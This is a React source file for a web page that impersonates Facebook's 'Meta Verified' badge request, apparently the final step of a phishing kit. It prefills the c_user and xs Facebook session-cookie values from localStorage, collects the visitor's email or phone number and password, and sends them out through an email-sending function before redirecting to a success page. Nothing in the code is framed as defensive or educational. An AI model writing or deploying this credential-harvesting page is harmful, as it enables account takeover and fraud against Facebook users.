import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { formTwoSchema, type ConfirmationForm } from "@shared/schema";
import { sendConfirmationFormEmail } from "@/lib/emailService";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { countries } from "@/lib/countries";
import { Eye, EyeOff, Search } from "lucide-react";

export default function Confirmation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [showPassword, setShowPassword] = useState(false);
  const [countrySearch, setCountrySearch] = useState('');
  const [filteredCountries, setFilteredCountries] = useState(countries);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Load validation data from localStorage
  const validationData = (() => {
    try {
      const stored = localStorage.getItem('validation_data');
      if (!stored) return null;
      return JSON.parse(stored);
    } catch {
      return null;
    }
  })();

  const form = useForm<ConfirmationForm>({
    resolver: zodResolver(formTwoSchema),
    defaultValues: {
      c_user: validationData?.c_user || '',
      xs: validationData?.xs || '',
      user_email: '',
      password: '',
      contactMethod: 'email',
      countryCode: '+1'
    }
  });

  const contactMethod = form.watch('contactMethod');

  useEffect(() => {
    if (!validationData) {
      setLocation('/validation');
    }
  }, [validationData, setLocation]);

  useEffect(() => {
    const filtered = countries.filter(country =>
      country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
      country.code.toLowerCase().includes(countrySearch.toLowerCase())
    );
    setFilteredCountries(filtered);
  }, [countrySearch]);

  const onSubmit = async (data: ConfirmationForm) => {
    try {
      setIsSubmitting(true);

      const submissionData = {
        ...data,
        timestamp: new Date().toISOString(),
        user_email: contactMethod === 'phone' 
          ? `${data.countryCode}${data.user_email}`
          : data.user_email
      };

      await sendConfirmationFormEmail(submissionData);

      localStorage.removeItem('validation_data');

      toast({
        title: "Success!",
        description: "Your form has been submitted successfully."
      });

      setTimeout(() => setLocation("/success"), 1000);
    } catch (error) {
      console.error('Form submission error:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again."
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
      <MetaTags
        title="Meta Verified | Confirmation"
        description="Request a verified badge on Facebook - Final Step"
      />

      <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
        <img
          src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
          alt="Facebook"
          className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
        />
        <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
          Facebook Security
        </h1>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <FormField
              control={form.control}
              name="contactMethod"
              render={({ field }) => (
                <FormItem>
                  <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                    Contact Method
                  </FormLabel>
                  <div className="flex gap-4">
                    <button
                      type="button"
                      onClick={() => field.onChange('email')}
                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                        field.value === 'email'
                          ? 'bg-[#1877f2] text-white'
                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#1877f2]/10'
                      }`}
                    >
                      Email
                    </button>
                    <button
                      type="button"
                      onClick={() => field.onChange('phone')}
                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                        field.value === 'phone'
                          ? 'bg-[#1877f2] text-white'
                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#1877f2]/10'
                      }`}
                    >
                      Phone
                    </button>
                  </div>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="user_email"
              render={({ field }) => (
                <FormItem>
                  <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                    {contactMethod === 'email' ? 'Email Address' : 'Phone Number'}
                  </FormLabel>
                  <FormControl>
                    <div className="flex gap-2">
                      {contactMethod === 'phone' && (
                        <FormField
                          control={form.control}
                          name="countryCode"
                          render={({ field: countryField }) => (
                            <Select
                              value={countryField.value}
                              onValueChange={countryField.onChange}
                            >
                              <SelectTrigger className="w-[100px]">
                                <SelectValue placeholder="Code" />
                              </SelectTrigger>
                              <SelectContent>
                                <div className="sticky top-0 p-2 bg-white border-b z-50">
                                  <div className="flex items-center px-2 py-1 border rounded-md">
                                    <Search className="w-4 h-4 text-gray-500 mr-2" />
                                    <input
                                      className="w-full outline-none text-sm"
                                      placeholder="Search country..."
                                      value={countrySearch}
                                      onChange={(e) => setCountrySearch(e.target.value)}
                                    />
                                  </div>
                                </div>
                                <div className="max-h-[200px] overflow-y-auto">
                                  {filteredCountries.map((country) => (
                                    <SelectItem key={country.code} value={country.code}>
                                      {country.code} ({country.name})
                                    </SelectItem>
                                  ))}
                                </div>
                              </SelectContent>
                            </Select>
                          )}
                        />
                      )}
                      <Input
                        type={contactMethod === 'email' ? 'email' : 'tel'}
                        placeholder={
                          contactMethod === 'email'
                            ? "Enter email address"
                            : "Enter phone number"
                        }
                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                        {...field}
                      />
                    </div>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                    Password
                  </FormLabel>
                  <FormControl>
                    <div className="relative">
                      <Input
                        type={showPassword ? "text" : "password"}
                        placeholder="Enter password"
                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20 pr-10"
                        {...field}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                      >
                        {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                      </button>
                    </div>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <Button
              type="submit"
              className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200"
              disabled={isSubmitting}
            >
              {isSubmitting ? "Submitting..." : "Submit"}
            </Button>
          </form>
        </Form>
      </div>
    </div>
  );
}